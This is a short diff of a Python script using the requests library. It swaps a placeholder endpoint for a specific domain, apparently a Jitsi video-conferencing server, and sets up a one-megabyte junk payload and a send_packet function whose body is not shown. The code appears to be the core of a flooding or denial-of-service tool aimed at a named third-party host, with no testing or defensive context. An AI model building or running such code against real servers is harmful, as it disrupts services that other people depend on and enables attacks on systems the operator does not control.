@@ -1,9 +1,7 @@
 import requests
 import time
 
-url = "https://jitsi.pashmak.net/"
-
-url = "http://your-server-ip-or-domain/api"
+url = "https://jitsi.pashmak.net"
 payload = b'a' * (1024 * 1024)
 
 def send_packet(n):
